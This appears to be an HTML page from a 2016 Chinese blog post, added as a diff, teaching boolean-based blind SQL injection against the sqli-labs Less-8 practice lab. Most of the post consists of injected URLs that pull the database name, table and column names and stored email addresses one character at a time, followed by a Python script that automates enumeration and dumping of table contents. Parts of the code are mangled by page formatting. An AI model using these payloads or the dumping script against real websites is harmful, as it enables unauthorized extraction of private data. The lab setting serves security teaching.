@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>sql注入之盲注 | liuqi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="" />
+    
+    <meta name="description" content="特点：当页面存在注入，但是没有显示位，且没有用echo “mysql_error()”输出错误信息时可以用，它一次只能猜测一个字节，速度慢，但是只要存在注入就能用用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) –+根据返回页面是否相同来得到数据注入步骤
+找注入点、猜闭合字符
+猜解列数、尝试得到显示位
+猜数据库名
+猜表名
+猜列名
+猜列值
+
+找到注入点，判断">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入之盲注">
+<meta property="og:url" content="http://yoursite.com/2016/07/07/sql注入之盲注/index.html">
+<meta property="og:site_name" content="liuqi">
+<meta property="og:description" content="特点：当页面存在注入，但是没有显示位，且没有用echo “mysql_error()”输出错误信息时可以用，它一次只能猜测一个字节，速度慢，但是只要存在注入就能用用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) –+根据返回页面是否相同来得到数据注入步骤
+找注入点、猜闭合字符
+猜解列数、尝试得到显示位
+猜数据库名
+猜表名
+猜列名
+猜列值
+
+找到注入点，判断">
+<meta property="og:updated_time" content="2016-07-07T00:44:48.145Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入之盲注">
+<meta name="twitter:description" content="特点：当页面存在注入，但是没有显示位，且没有用echo “mysql_error()”输出错误信息时可以用，它一次只能猜测一个字节，速度慢，但是只要存在注入就能用用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) –+根据返回页面是否相同来得到数据注入步骤
+找注入点、猜闭合字符
+猜解列数、尝试得到显示位
+猜数据库名
+猜表名
+猜列名
+猜列值
+
+找到注入点，判断">
+    
+
+    
+        <link rel="alternate" href="/" title="liuqi" type="application/atom+xml" />
+    
+
+    
+
+    <link rel="stylesheet" href="/vendor/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/vendor/titillium-web/styles.css">
+    <link rel="stylesheet" href="/vendor/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/vendor/jquery/2.0.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/vendor/fancybox/jquery.fancybox.css">
+    
+    
+        <link rel="stylesheet" href="/vendor/scrollLoading/style.css">
+    
+    
+    
+
+</head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Inici</a>
+                                </li>
+                            
+                                        
+                                    
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/about/index.html">Quant a</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Cercar" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'categories',
+            TAGS: 'etiquetes',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    Sense categoria
+    </h1>
+</div>
+                        <div class="main-body-content">
+                            <article id="post-sql注入之盲注" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        sql注入之盲注
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-subtitle">
+                <a href="/2016/07/07/sql注入之盲注/" class="article-date">
+    <time datetime="2016-07-07T00:35:30.000Z" itemprop="datePublished">2016-07-07</time>
+</a>
+                
+            </div>
+        
+        <div class="article-entry" itemprop="articleBody">
+            <p>特点：当页面存在注入，但是没有显示位，且没有用echo “mysql_error()”输出错误信息时可以用，<br>它一次只能猜测一个字节，速度慢，但是只要存在注入就能用<br>用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) –+<br>根据返回页面是否相同来得到数据<br>注入步骤</p>
+<pre><code>找注入点、猜闭合字符
+猜解列数、尝试得到显示位
+猜数据库名
+猜表名
+猜列名
+猜列值
+</code></pre><ol>
+<li>找到注入点，判断闭合字符</li>
+<li>尝试猜解列数，得到显示位，并不能爆出显示位</li>
+<li>得到数据库名<br>4.得到表名<br>5得到列名<br>6得到列值<br>EXISTS 是判断是否存在,和in类似,但效率要比in高</li>
+</ol>
+<p>SELECT * FROM  EMP (基础表)  WHERE  EMPNO &gt; 0  AND  EXISTS (SELECT ‘X’  FROM DEPT  WHERE  DEPT.DEPTNO = EMP.DEPTNO  AND  LOC = ‘MELB’)</p>
+<p>SELECT  * FROM  EMP (基础表)  WHERE  EMPNO &gt; 0  AND  DEPTNO IN(SELECT DEPTNO  FROM  DEPT  WHERE  LOC = ‘MELB’)</p>
+<p>这两句效果一样<br>ASCII(str)</p>
+<p>返回最左边的字符的字符串str的数值。如果str是空字符串，返回0<br>———————-+<br>                   53 |<br>———————-+</p>
+<p>SUBSTR函数是用来截取数据库某一列字段中的一部分。<br>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。</p>
+<p>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。</p>
+<p>这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始。是吧。</p>
+<p>mysql&gt; select substr(“ashdgfh”,2,1);<br>+———————–+<br>| substr(“ashdgfh”,2,1) |<br>+———————–+<br>| s                     |<br>+———————–+<br>1 row in set (0.00 sec)</p>
+<p>mysql&gt; select substr(“ashdgfh”,2,2);<br>+———————–+<br>| substr(“ashdgfh”,2,2) |<br>+———————–+<br>| sh                    |<br>+———————–+<br>1 row in set (0.00 sec)</p>
+<p>mysql&gt; select (select ascii(substr((select user()),1,1)))&gt;100;<br>+————————————————-+<br>| (select ascii(substr((select user()),1,1)))&gt;100 |<br>+————————————————-+<br>|                                               1 |<br>+————————————————-+<br>1 row in set (0.00 sec)</p>
+<p>mysql&gt; select (select ascii(substr((select user()),1,1)))&gt;120;<br>+————————————————-+<br>| (select ascii(substr((select user()),1,1)))&gt;120 |<br>+————————————————-+<br>|                                               0 |<br>+————————————————-+<br>1 row in set (0.00 sec)</p>
+<p><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and (select length((select database()))&gt;8) –+    长度是8位 8不正常<br><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and (select ascii(select (substr((select database()),1,1))&gt;113) –+</p>
+<pre><code>115
+</code></pre><p><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and (select ascii (substr((select database()),1,1))&gt;115)<br>–+</p>
+<p><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and ((select count(table_name) from information_schema.tables where table_schem<br>a=’security’)</p>
+<blockquote>
+<p>4)<br>–+  判断数据库有几张表</p>
+</blockquote>
+<p>判断有多少张表<br>mysql&gt; select count(table_name) from information_schema.tables where table_schem<br>a=database();<br>+——————-+<br>| count(table_name) |<br>+——————-+<br>|                 5 |<br>+——————-+<br>1 row in set (0.00 sec)</p>
+<p>mysql&gt; use information_schema;<br>Database changed<br>mysql&gt; select count(table_name) from information_schema.tables where table_schem<br>a=’security’;<br>+——————-+<br>| count(table_name) |<br>+——————-+<br>|                 5 |<br>+——————-+<br>1 row in set (0.00 sec)</p>
+<p>select count(table_name) from information_schema.tables where table_schem<br>a=’security’;</p>
+<p>select ascii(substr((select table_name from information_schema.tables whe<br>re table_schema=database() limit 0,1),1,1))&gt;100;</p>
+<p>首先判断长度</p>
+<p><a href="http://127.0.0.1/sqli/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/?id=1</a>‘ and (select length((select database()))&gt;8) –+   证明长度返回为8<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select ascii(substr((select database()),1,1)) &gt;115) –+  判断第一个字符为ascii码为115<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select ascii(substr((select database()),2,1)) &gt;101) –+    第二个字符       101<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select ascii(substr((select database()),8,1)) &gt;121) –+     第二个字符       121<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select (ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1)))&gt;114.) –+<br>该security库中 第二个表的表名第一个字的ascii码为114</p>
+<p>ascii(substr())</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and length(version())=6<br> –+</p>
+<h1 id="判断表存在不存在"><a href="#判断表存在不存在" class="headerlink" title="判断表存在不存在"></a>判断表存在不存在</h1><p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and exists(select * from information_schema.tables)<br> –+</p>
+<h1 id="判断version-返回字符串-长度"><a href="#判断version-返回字符串-长度" class="headerlink" title="判断version()返回字符串 长度"></a>判断version()返回字符串 长度</h1><p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select length(version()))=6<br> –+</p>
+<h1 id="判断有多少个库"><a href="#判断有多少个库" class="headerlink" title="判断有多少个库"></a>判断有多少个库</h1><p>select count(distinct+table_schema) from information_schema.tables</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select count(distinct+table_schema) from information_schema.tables) &gt; 10<br> –+        </p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select count(distinct+table_schema) from information_schema.tables) &gt;3<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select count(distinct+table_schema) from information_schema.tables) =4<br> –+</p>
+<h1 id="判断每一个库名"><a href="#判断每一个库名" class="headerlink" title="判断每一个库名"></a>判断每一个库名</h1><p>select distinct table_schema from information_schema.tables limit 0,1</p>
+<p>select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1));;</p>
+<p>第一个库的第一个字符<br><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) &gt; 100<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) &gt; 105<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) &gt; 104<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) = 105<br> –+</p>
+<p>依次类推</p>
+<p>第一个库的第二个字符<br><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 2 ,1))) &gt; 100<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 2 ,1)))  = 110<br> –+</p>
+<h1 id="判断某个库有多少个表"><a href="#判断某个库有多少个表" class="headerlink" title="判断某个库有多少个表"></a>判断某个库有多少个表</h1><p>bool型注入漏洞分析<br>1.判断当前数据库<br>查出数据库的ascii码，然后转换为字符串<br>select ascii(substr(select database()),1,1)<br>2.知道数据库名之后判断数据库有多少表<br>3.获取第一个表的字符的ascii码然后之后的获取之后的<br>4.知道表的名字之后获取内容</p>
+<h1 id="课堂演示"><a href="#课堂演示" class="headerlink" title="课堂演示"></a>课堂演示</h1><p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘ –+<br>select database()</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select length((select database())) &gt; 8)<br> –+</p>
+<p>长度( length(select database()) ): 8<br>当前数据库第一个字符的ascii码<br>select ascii(substr((select database()), 1, 1))<br><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select database()), 1, 1)) &gt; 114)<br> –+<br>当前数据库第一个字符的ascii码 = 115   s<br><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select database()), 2, 1)) &gt; 101)<br> –+</p>
+<p>当前数据库第2个字符的ascii码 = 101   e</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select database()), 8, 1)) = 121)<br> –+</p>
+<p>当前数据库第8个字符的ascii码 = 121   y</p>
+<h1 id="当前数据库有多少个表"><a href="#当前数据库有多少个表" class="headerlink" title="当前数据库有多少个表"></a>当前数据库有多少个表</h1><p>select count(table_name) from information_schema.tables where table_schema=database()</p>
+<p>select count(table_name) from information_schema.tables where table_schema=’security’</p>
+<p>select count(table_name) from information_schema.tables where table_schema=0x7365637572697479</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select count(table_name) from information_schema.tables where table_schema=0x7365637572697479) &gt; 4)<br> –+</p>
+<p>当前数据库有多少个表  : 4</p>
+<h1 id="获取当前数据库的第一个表的第一个字符的length"><a href="#获取当前数据库的第一个表的第一个字符的length" class="headerlink" title="获取当前数据库的第一个表的第一个字符的length"></a>获取当前数据库的第一个表的第一个字符的length</h1><p>select length((select table_name from information_schema.tables where table_schema=database() limit 0,1))</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5)<br> –+</p>
+<p> 获取当前数据库的第一个表的第一个字符的length: 6</p>
+<h1 id="获取当前数据库的第一个表的第一个字符的ascii"><a href="#获取当前数据库的第一个表的第一个字符的ascii" class="headerlink" title="获取当前数据库的第一个表的第一个字符的ascii"></a>获取当前数据库的第一个表的第一个字符的ascii</h1><p>select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1))</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) &gt; 100)<br> –+</p>
+<p>获取当前数据库的第一个表的第一个字符的ascii: 101</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 2, 1)) &gt; 109)<br> –+</p>
+<p>获取当前数据库的第一个表的第2个字符的ascii: 109</p>
+<h1 id="获取当前数据库的emails表的第1列-列名的第1个字符的length"><a href="#获取当前数据库的emails表的第1列-列名的第1个字符的length" class="headerlink" title="获取当前数据库的emails表的第1列 列名的第1个字符的length"></a>获取当前数据库的emails表的第1列 列名的第1个字符的length</h1><p>select length(column_name) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select length(column_name) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1) &gt; 2)<br> –+</p>
+<p>获取当前数据库的emails表的第1列 列名的第1个字符的length : 2</p>
+<h1 id="获取当前数据库的emails表的第1列-列名"><a href="#获取当前数据库的emails表的第1列-列名" class="headerlink" title="获取当前数据库的emails表的第1列 列名"></a>获取当前数据库的emails表的第1列 列名</h1><p>select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1) &gt; 104)<br> –+</p>
+<p> 105</p>
+<h1 id="获取内容"><a href="#获取内容" class="headerlink" title="获取内容"></a>获取内容</h1><p>select length(email_id) from emails limit 0,1</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select length(email_id) from emails limit 0,1) &gt; 16)<br> –+</p>
+<p>length : 16 </p>
+<p>select email_id from emails limit 0,1</p>
+<p>select ascii(substr(email_id, 1, 1)) from emails limit 0,1</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select ascii(substr(email_id, 1, 1)) from emails limit 0,1) &gt; 67)<br> –+</p>
+<p> 68 </p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select ascii(substr(email_id, 2, 1)) from emails limit 0,1) &gt; 116)<br> –+</p>
+<p>117</p>
+<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select ascii(substr(email_id, 3, 1)) from emails limit 0,1) &gt; 109)<br> –+</p>
+<p> 109</p>
+<p>附上代码：</p>
+<p>#cding=utf-8<br>import re<br>import sys<br>import requests<br>import binascii</p>
+<p>def getAllDatabases(url):<br>    num = 1<br>    while(True):<br>        db_url = url + “‘ and (select length((select database())) &gt; %d) –+” % num<br>        res = requests.get(db_url)<br>        con = res.content<br>        db_num = re.search(r’size=”5” color=”#FFFF00”&gt;(.<em>?)<br>‘,con.decode(‘utf8’))<br>        num += 1<br>        if db_num is None:<br>            break<br>    print (“Database Length: %d” % (num-1))<br>    le = num<br>    db = []<br>    for index in range(1,le):<br>        num = 1<br>        while(True):<br>            db_url = url + “‘ and (select ascii(substr((select database()), %d, 1)) &gt; %d) –+” % (index,num)<br>            res = requests.get(db_url)<br>            con = res.content<br>            db_num = re.search(r’size=”5” color=”#FFFF00”&gt;(.</em>?)<br>‘,con.decode(‘utf8’))<br>            num += 1<br>            if db_num is None:<br>                break<br>        db.append(chr(num - 1))<br>    data_name = ‘’.join(db)<br>    print (“Database : %s” % data_name)<br>def getAlltables(url,db_name):<br>    num = 1</p>
+<pre><code># db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
+db_name_hex = &quot;0x7365637572697479&quot;
+while(True):
+    db_url = url + &quot;&apos; and ((select count(table_name) from information_schema.tables where table_schema=%s) &gt; %d) --+&quot; % (db_name_hex,num)
+    res = requests.get(db_url)
+    con = res.content
+    db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
+    num += 1
+    if db_num is None:
+        break
+print (&quot;Table number: %d&quot; % (num-1))
+lol = num - 1
+le = num  #le=5
+db = []
+for le in range(0,(le-1)):
+    num = 1
+    while(True):
+        table_url = url + &quot;&apos; and ((select length((select table_name from information_schema.tables where table_schema=database() limit %d,1))) &gt; %d) --+&quot; % (le,num)
+        # print (table_url)
+        res = requests.get(table_url)
+        con = res.content
+        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
+        if db_num is None:
+            break
+        else:
+            num += 1
+    db.append(num)
+print (db)
+tab = []
+for l in range(0,lol):
+    dx = []
+    x = db[l] + 1
+    for index in range(1,x):
+        num = 1
+        while(True):
+            db_url = url + &quot;&apos; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1), %d, 1)) &gt; %d) --+&quot; % (l,index,num)
+            res = requests.get(db_url)
+            con = res.content
+            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
+            if db_num is None:
+                break
+            else:
+                num += 1
+        print (&quot;Table %d is : %s&quot; % (index,chr(num)))
+        dx.append(chr(num))
+    data_name = &apos;&apos;.join(dx)
+    print (&quot;The %d table : %s&quot; % ((l+1),data_name))
+    tab.append(data_name)
+print (&quot;Database: %s&quot; % db_name)
+for h in tab:
+    print (&quot;|    %s&quot; % h)
+</code></pre><p>def getAllcolumns(url,database,table):<br>    num = 1</p>
+<pre><code># db_name_hex = &quot;0x&quot; + binascii.b2a_hex(database)
+# table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table)
+db_name_hex = &quot;0x7365637572697479&quot;
+table_name_hex = &quot;0x7573657273&quot;
+while(True):
+    db_url = url + &quot;&apos; and ((select count(column_name) from information_schema.columns where table_schema=database() and table_name=%s limit 0,1) &gt; %d) --+&quot; % (table_name_hex,num)
+    res = requests.get(db_url)
+    con = res.content
+    db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
+    num += 1
+    if db_num is None:
+        break
+print (&quot;column number: %d&quot; % (num-1))
+lol = (num-1)
+column_num = []
+for x in range(0,(num-1)):
+    num_col = 1
+    while(True):
+        db_url = url + &quot;&apos; and ((select length(column_name) from information_schema.columns where table_schema=database() and table_name=%s limit %d,1) &gt; %d) --+&quot; % (table_name_hex,x,num_col)
+        # print (db_url)
+        res = requests.get(db_url)
+        con = res.content
+        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
+        if db_num is None:
+            break
+        else:
+            num_col += 1
+    column_num.append(num_col)
+    print (&quot;column %d number: %d&quot; % ((x+1),num_col))
+tab = []
+for l in range(0,lol):
+    dx = []
+    x = column_num[l] + 1
+    for index in range(1,x):
+        num = 1
+        while(True):
+            db_url = url + &quot;&apos; and ((select ascii(substr(column_name, %d, 1)) from information_schema.columns where table_schema=database() and table_name=%s limit %d,1) &gt; %d) --+&quot; % (index,table_name_hex,l,num)
+            res = requests.get(db_url)
+            con = res.content
+            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
+            if db_num is None:
+                break
+            else:
+                num += 1
+        print (&quot;Table %d is : %s&quot; % (index,chr(num)))
+        dx.append(chr(num))
+    data_name = &apos;&apos;.join(dx)
+    print (&quot;The %d column : %s&quot; % ((l+1),data_name))
+    tab.append(data_name)
+print (&quot;Database: %s&quot; % table)
+for h in tab:
+    print (&quot;|    %s&quot; % h)
+</code></pre><p>def getAllcontents(url,database,table,column):</p>
+<pre><code># table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table)
+# column_name_hex = &quot;0x&quot; + binascii.b2a_hex(column)
+column_name_hex = &quot;0x757365726e616d65&quot;
+db_name_hex = &quot;0x7365637572697479&quot;
+table_name_hex = &quot;0x7573657273&quot;
+num = 1
+while(True):
+    db_url = url + &quot;&apos; and ((select count(%s) from %s limit 0,1) &gt; %d) --+&quot; % (column,table,num)
+    res = requests.get(db_url)
+    con = res.content
+    db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
+    if db_num is None:
+        break
+    else:
+        num += 1
+print (&quot;%s number: %d&quot; % (column,num))
+lol = num
+print (lol)
+column_num = []
+colm = []
+for x in range(0,lol):
+    num_col = 1
+    while(True):
+        db_url = url + &quot;&apos; and ((select length(%s) from %s limit %d,1) &gt; %d) --+&quot; % (column,table,x,num_col)
+        res = requests.get(db_url)
+        con = res.content
+        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
+        if db_num is None:
+            break
+        else:
+            num_col += 1
+    print (&quot;Column : %s number: %d is : %s &quot; % (column,(x+1),num_col))
+    for op in range(1,(num_col+1)):
+        num_op = 1
+        while(True):
+            con_url = url + &quot;&apos; and ((select ascii(substr(%s, %d, 1)) from %s limit %d,1) &gt; %d) --+&quot; % (column,op,table,x,num_op)
+            res = requests.get(con_url)
+            con = res.content
+            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
+            if db_num is None:
+                break
+            else:
+                num_op += 1
+        column_num.append(chr(num_op))
+        print (&quot;Column : %s number: %d is : %s &quot; % (column,op,chr(num_op)))
+    col_data_name = &apos;&apos;.join(column_num)
+    print (col_data_name)
+    colm.append(col_data_name)
+for h in colm:
+    print (&quot;|    %s&quot; % h)    
+</code></pre><p>def main():<br>    if sys.argv[1] == ‘–dbs’:<br>        getAllDatabases(sys.argv[2])<br>    elif sys.argv[1] == ‘–tab’:<br>        getAlltables(sys.argv[2],sys.argv[3])<br>    elif sys.argv[1] == ‘–col’:<br>        getAllcolumns(sys.argv[2],sys.argv[3],sys.argv[4])<br>    elif sys.argv[1] == ‘–dump’:<br>        getAllcontents(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])<br>    else:<br>        print (‘What…’)</p>
+<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()</p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="http://yoursite.com/2016/07/07/sql注入之盲注/" data-id="ciqud1nsk0007kghrtz93o8dp" class="article-share-link"><i class="fa fa-share"></i>Compartir</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
